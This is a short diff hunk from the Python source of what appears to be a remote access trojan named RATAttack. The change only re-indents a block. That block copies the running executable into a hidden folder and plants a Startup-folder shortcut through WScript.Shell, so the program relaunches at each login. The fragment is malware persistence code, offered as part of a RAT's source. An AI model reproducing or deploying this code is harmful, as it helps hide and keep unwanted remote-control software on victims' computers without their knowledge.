@@ -36,14 +36,14 @@ if (argv[0]).endswith('.exe'):
 	# ---------------------------------------------
 	if not os.path.exists(hide_folder):
 		os.makedirs(hide_folder)
-	hide_compiled = hide_folder + '\\' + compiled_name
-	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
-	copyfile(argv[0], hide_compiled)
-	shell = Dispatch('WScript.Shell')
-	shortcut = shell.CreateShortCut(target_shortcut)
-	shortcut.Targetpath = hide_compiled
-	shortcut.WorkingDirectory = hide_folder
-	shortcut.save()
+		hide_compiled = hide_folder + '\\' + compiled_name
+		target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
+		copyfile(argv[0], hide_compiled)
+		shell = Dispatch('WScript.Shell')
+		shortcut = shell.CreateShortCut(target_shortcut)
+		shortcut.Targetpath = hide_compiled
+		shortcut.WorkingDirectory = hide_folder
+		shortcut.save()
 else:
 	hide_folder = path[0] + '\\RATAttack'
 	if not os.path.exists(hide_folder):
